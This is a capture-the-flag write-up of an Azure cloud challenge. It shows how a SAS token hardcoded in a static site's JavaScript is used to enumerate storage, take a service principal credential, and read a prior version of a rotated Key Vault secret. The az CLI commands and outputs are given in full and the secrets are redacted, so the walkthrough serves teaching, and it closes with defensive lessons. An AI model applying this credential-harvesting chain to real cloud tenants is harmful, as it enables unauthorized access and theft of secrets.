# Day - 9

---

**Challenge name:** CryptoCabana

**Category:** Cloud

**Difficulty:** Medium

**Date completed:** 4th of August 2026

---

## Summary

CryptoCabana is a static "seed phrase backup" kiosk hosted on Azure Static Website hosting. The client-side JS shipped a SAS token that was scoped way more broadly than the feature needed - account-level list+read instead of just the one container the upload used. That let me enumerate the whole storage account and find a `vault` container the site itself never linked to, sitting alongside the `backups` container the form actually posts to. Inside was a service principal's credentials, which logged into an Azure Key Vault holding the "real" secret material as three key shards. One shard had been rotated after a leak, but the previous version was still sitting in the vault's version history and gave up the real value. Stitching the three shards together gave the flag.

---

### Step 1: Look at what the page ships for free

The rendered page is just a form ("paste your recovery phrase, we'll back it up"), so the interesting part had to be in the JS behind it rather than the HTML:

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/ -o index.html
grep -oE '<script[^>]*src="[^"]*"' index.html
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/app.js -o app.js
cat app.js
```

`app.js` had the storage account name, the target container, and a SAS token hardcoded right there in the client:

```jsx
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=[REDACTED]";
```

Anything typed into the form got PUT straight to blob storage from the browser using that token, no backend in the loop at all.

---

### Step 2: The SAS token was over-scoped

Reading the token parameters closely mattered here: `ss=b` (blob service), `srt=sco` (service + container + object), `sp=rl` (read + list). None of that is limited to the `backups` container - it's valid for the whole storage account. The feature only needed write access to one container, but the token could list and read everything in it.

```bash
SAS='[REDACTED - see app.js]'

az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "$SAS" \
  -o table
```

```
Name     Lease Status    Last Modified
-------  --------------  -------------------------
$web                     2026-07-16T18:26:22+00:00
backups                  2026-07-16T18:26:22+00:00
vault                    2026-07-16T18:26:23+00:00
```

`$web` is just the site itself and `backups` is what the form uses - but `vault` is never referenced anywhere on the page.

---

### Step 3: Enumerate the container the site never points to

```bash
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token "$SAS" \
  -o table
```

```
Name                         Blob Type    Length    Content Type
---------------------------  -----------  --------  ------------------------
backup-service-account.json  BlockBlob    360       application/json
seed_phrase.txt              BlockBlob    88        application/octet-stream
```

`seed_phrase.txt` looked like bait (a plausible-looking mnemonic dropped in there for flavour), but `backup-service-account.json` was the real find:

```bash
az storage blob download --account-name cryptocabanaf5scjagc --container-name vault \
  --name backup-service-account.json --sas-token "$SAS" --file ./backup-service-account.json
cat backup-service-account.json
```

```json
{
  "client_id": "[REDACTED]",
  "client_secret": "[REDACTED]",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
  "tenant_id": "[REDACTED]"
}
```

A full service principal, sitting readable behind the same over-scoped token that was supposed to only handle phrase uploads. The note about rotating it is a bit ironic given it was reachable in the first place.

---

### Step 4: Log in as the service principal

```bash
az login --service-principal \
  -u <client_id from backup-service-account.json> \
  -p '<client_secret from backup-service-account.json>' \
  --tenant <tenant_id from backup-service-account.json>
```

That authenticated as the SP, giving access to the `Az-Subs-CTF` subscription in the box's tenant.

```bash
az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table
```

```
Name         Enabled    Expires
-----------  ---------  -------------------------
key-shard-1  True
key-shard-2  True
key-shard-3  True
master-key   True       2020-01-01T00:00:00+00:00
```

Four secrets: three shards and a `master-key` that expired years ago.

---

### Step 5: The rotated shard

`master-key` returned `(Forbidden)` on read - the SP had list access to secrets but no `getSecret` RBAC role on the vault for that specific one, and it's expired anyway. Dead end, not part of the intended path.

Checking version counts on the shards, `key-shard-2` stood out with two versions instead of one:

```bash
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 -o json
```

```json
[
  { "attributes": { "created": "2026-07-28T01:05:05+00:00" }, "id": ".../key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0" },
  { "attributes": { "created": "2026-07-28T01:05:07+00:00" }, "id": ".../key-shard-2/c922c422ffb34671a902389c372314f1" }
]
```

Two seconds apart - a rotation, not two independent secrets. Reading the newer version straight up confirmed it:

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 \
  --version c922c422ffb34671a902389c372314f1 --query value -o tsv
```

```
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
```

Key Vault soft-delete/versioning keeps old secret values around by design unless someone explicitly purges them, so "rotated" doesn't mean "gone." Pulling the version that came before it:

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 \
  --version <older version id from list-versions output> --query value -o tsv
```

```
[REDACTED - shard value]
```

---

### Step 6: Assemble the flag

```bash
for s in key-shard-1 key-shard-3; do
  az keyvault secret show --vault-name ccabana-kv-f5scjagc --name "$s" --query value -o tsv
done
```

```
key-shard-1:            THM{[REDACTED]
key-shard-2 (old ver.): [REDACTED]
key-shard-3:            [REDACTED]}
```

Concatenated in order gives the flag: `THM{...}`

---

## Why this worked

The core mistake was scoping the SAS token to the account instead of the one thing the feature actually needed. `sp=rl` with `srt=sco` at the account level is convenient to generate once and forget about, but it means anyone who gets their hands on it - and it was sitting in plaintext client-side JS, so that's trivial - can walk the entire storage account, not just the container the upload button touches. The `vault` container had no reason to be reachable by a public seed-phrase-backup token, but nothing was actually enforcing that boundary.

From there it's a straightforward trust chain: the leaked storage token led to a leaked service principal, and the service principal led to a Key Vault. None of that required breaking anything, it was all "correctly" configured access, just handed to the wrong audience two steps too early.

The rotated secret is the part worth remembering. Rotating a leaked credential is the right move, but Key Vault's default behaviour is to keep prior versions readable unless someone also disables or purges them. Rotation stops the *old* value from being the current one - it doesn't stop it from being fetchable by anyone who still has read access and knows to ask for it by version.

---

## Lessons Learned

- Scope SAS tokens to the exact resource and permission a feature needs (ideally a single blob, or at least a single container with only the operations required). Account-level `list+read` tokens turn one leaked credential into a full storage account enumeration.
- Never ship long-lived credentials - SAS tokens, connection strings, service principal secrets - in client-side code. If the browser needs to write to storage, put a thin backend in front of it that mints short-lived, narrowly-scoped tokens per request.
- Don't assume "not linked from the UI" means "not reachable." Anything sitting in a container/bucket the token can list is exposed, whether or not the app's own pages ever reference it.
- Rotating a secret is necessary but not sufficient. Old versions of a Key Vault secret remain readable to anyone with `getSecret` unless disabled or purged - if a value leaks, treat every prior version as leaked too.
- Service principals dropped into storage as "just a config file" are still credentials. They deserve the same handling as any other secret - not sitting in a world-listable container.
